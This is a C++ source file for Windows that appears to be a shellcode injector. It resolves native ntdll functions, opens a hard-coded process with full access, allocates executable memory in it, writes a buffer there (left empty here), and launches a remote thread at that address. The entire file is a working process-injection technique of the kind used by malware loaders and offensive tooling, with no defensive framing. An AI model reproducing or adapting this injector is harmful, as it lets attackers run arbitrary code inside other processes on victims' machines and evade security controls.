#include <Windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef NTSTATUS(WINAPI* ZWALLOCATEVIRTUALMEMORY)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect);

typedef NTSTATUS(WINAPI* ZWWRITEVIRTUALMEMORY)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG BufferSize,
	PULONG NumberOfBytesWritten);

typedef LONG(NTAPI *PFN_NTCREATETHREADEX)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	PVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	PVOID lpParameter,
	BOOL CreateSuspended,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer
	);


unsigned char buf[] = "";

int main(int argc, char *argv[]) {

	PVOID pBaseAddress = nullptr;
	SIZE_T regionSize = sizeof(buf);
	ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
	ULONG protect = PAGE_EXECUTE_READWRITE;
	ULONG bytesWritten = 0;
	HANDLE hThread = NULL;

	// Get NTDLL
	HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
	if (hNtDll == NULL)
	{
		std::cerr << "LoadLibrary failed: " << GetLastError() << std::endl;
		return 1;
	}

	// Defines
	ZWALLOCATEVIRTUALMEMORY ZwAllocateVirtualMemory = (ZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtDll, "ZwAllocateVirtualMemory");
	if (ZwAllocateVirtualMemory == nullptr) {
		std::cerr << "Failed to load ZwAllocateVirtualMemory function" << std::endl;
		return 1;
	}

	ZWWRITEVIRTUALMEMORY ZwWriteVirtualMemory = (ZWWRITEVIRTUALMEMORY)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
	if (ZwWriteVirtualMemory == nullptr) {
		std::cerr << "Failed to load NtWriteVirtualMemory function" << std::endl;
		return 1;
	}

	PFN_NTCREATETHREADEX pfnNtCreateThreadEx = (PFN_NTCREATETHREADEX)GetProcAddress(hNtDll, "NtCreateThreadEx");
	if (pfnNtCreateThreadEx == NULL)
	{
		std::cerr << "GetProcAddress failed: " << GetLastError() << std::endl;
		return 1;
	}

	HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5576);
	if (h_process == NULL)
	{
		printf("[X] Could not obtain handle\n");
		return 1;
	}

	NTSTATUS status = ZwAllocateVirtualMemory(h_process, &pBaseAddress, 0, &regionSize, allocationType, protect);
	if (status == STATUS_SUCCESS) {
		std::cout << "Virtual memory allocated successfully at address " << pBaseAddress << std::endl;
	}
	else {
		std::cerr << "Failed to allocate virtual memory. Status: " << std::hex << status << std::endl;
		return 1;
	}
	
	NTSTATUS status2 = ZwWriteVirtualMemory(h_process, pBaseAddress, buf, sizeof(buf), &bytesWritten);
	if (status2 == STATUS_SUCCESS) {
		std::cout << "Wrote " << bytesWritten << " bytes to virtual memory at address " << pBaseAddress << std::endl;
	}
	else {
		std::cerr << "Failed to write virtual memory. Status: " << std::hex << status2 << std::endl;
		return 1;
	}
	
	NTSTATUS statusfinal = pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, h_process, (LPTHREAD_START_ROUTINE)pBaseAddress, NULL, FALSE, 0, 0, 0, NULL);
}
